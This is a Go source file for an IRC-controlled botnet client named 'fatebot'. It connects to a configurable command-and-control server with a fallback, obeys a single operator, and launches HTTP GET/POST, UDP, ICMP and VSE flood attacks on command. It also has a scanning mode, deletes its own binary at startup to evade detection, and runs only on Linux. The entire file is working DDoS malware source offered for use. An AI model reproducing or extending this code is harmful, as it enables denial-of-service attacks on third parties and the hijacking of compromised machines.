package main

import (
	"bufio"
	"fmt"
	"net/textproto"
	"os"
	"runtime"

	"bot/pkg"
)

var (
	IRC_Server        = "" //config IRC server and port here. //ip:port //127.0.0.1:6667
	IRC_Backup_Server = "" //config like main server.
	IRC_Channel       = "" //config channel here. //"#Example"
	IRC_Chan_Password = "" //config channel password here. //If you didn't have, Just leave it blank.
	IRC_USNM          = "" //config your IRC username here. //For acces to your bot commands.
)

type reader struct {
	read string
}

func (read *reader) permission() bool {
	return pkg.Find(pkg.Recv(read.read, 0), IRC_USNM)
}

func fatebot(server string) error {
	conn := pkg.Conn(server)
	tp := textproto.NewReader(bufio.NewReader(conn))

	bot := &pkg.BOT{
		IRC:     conn,
		Channel: IRC_Channel,
		ChanKey: IRC_Chan_Password,
	}
	bot.Login()

	for {
		ircRead, err := tp.ReadLine()
		if err != nil {
			return err
		}
		read := &reader{
			read: ircRead,
		}

		go func() {
			if pkg.Find(ircRead, "PING :") {
				bot.Send("PONG " + pkg.Recv(ircRead, 1))
			}
		}()

		//Check is user modes and Join IRC channel
		if pkg.Find(ircRead, "+i") || pkg.Find(ircRead, "+w") || pkg.Find(ircRead, "+x") {
			bot.Send(fmt.Sprint("JOIN " + IRC_Channel + IRC_Chan_Password))
		}

		go func() {
			switch {
			case pkg.Find(ircRead, "?get") && read.permission():
				pkg.AttackSwitch = false
				go bot.GET(pkg.Recv(ircRead, 4))
				bot.Report("START HTTP GET FLOOD TO: " +
					pkg.Recv(ircRead, 4))
			case pkg.Find(ircRead, "?post") && read.permission():
				pkg.AttackSwitch = false
				go bot.POST(pkg.Recv(ircRead, 4))
				bot.Report("START HTTP POST FLOOD TO: " +
					pkg.Recv(ircRead, 4))
			case pkg.Find(ircRead, "?udp") && read.permission():
				pkg.AttackSwitch = false
				go bot.DUDP(pkg.Recv(ircRead, 4),
					pkg.Recv(ircRead, 5))
				bot.Report("START UDP FLOOD TO: " +
					pkg.Recv(ircRead, 4))
			case pkg.Find(ircRead, "?icmp") && read.permission():
				pkg.AttackSwitch = false
				go bot.ICMP(pkg.Recv(ircRead, 4))
				bot.Report("START ICMP FLOOD TO: " +
					pkg.Recv(ircRead, 4))
			case pkg.Find(ircRead, "?vse") && read.permission():
				pkg.AttackSwitch = false
				go bot.VSE(pkg.Recv(ircRead, 4))
				bot.Report("START VSE FLOOD TO: " +
					pkg.Recv(ircRead, 4))
			case pkg.Find(ircRead, "?scan") && read.permission():
				go bot.ScanMode(pkg.Recv(ircRead, 4),
					pkg.Recv(ircRead, 5))
				bot.Report("START SCANNING.")
			case pkg.Find(ircRead, "?info") && read.permission():
				bot.ReportInfo()
			case pkg.Find(ircRead, "?kill") && read.permission():
				os.Exit(0)
			case pkg.Find(ircRead, "?stopddos") && read.permission():
				pkg.AttackSwitch = true
				bot.Report("STOP ATTACKING.")
			case pkg.Find(ircRead, "?stopscan") && read.permission():
				pkg.ScanSwitch = true
				bot.Report("STOP SCANNING.")
			}
		}()
	}
}

func main() {
	os.Remove(os.Args[0])
	if runtime.GOOS != "linux" {
		os.Exit(0)
	}

	if fatebot(IRC_Server) != nil {
		for {
			if fatebot(IRC_Backup_Server) == nil {
				break
			}
		}
	}
}
